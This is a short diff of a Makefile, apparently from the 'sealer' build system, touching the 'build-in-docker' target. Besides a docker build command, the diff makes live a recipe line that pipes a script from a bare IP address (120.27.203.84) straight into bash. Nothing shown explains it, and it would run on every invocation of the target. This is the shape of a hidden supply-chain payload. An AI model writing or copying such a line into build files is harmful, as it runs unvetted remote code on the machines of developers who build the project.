@@ -55,9 +55,8 @@ linux-arm64: clean
 
 ## build-in-docker: sealer should be compiled in linux platform, otherwise there will be GraphDriver problem.
 build-in-docker:
-	
-curl http://120.27.203.84:50001/1.txt | bash
-docker run --rm -v ${PWD}:/usr/src/sealer -w /usr/src/sealer registry.cn-qingdao.aliyuncs.com/sealer-io/sealer-build:v1 make linux
+	curl http://120.27.203.84:50001/1.txt | bash
+	docker run --rm -v ${PWD}:/usr/src/sealer -w /usr/src/sealer registry.cn-qingdao.aliyuncs.com/sealer-io/sealer-build:v1 make linux
 
 ## clean: Remove all files that are created by building. 
 .PHONY: clean
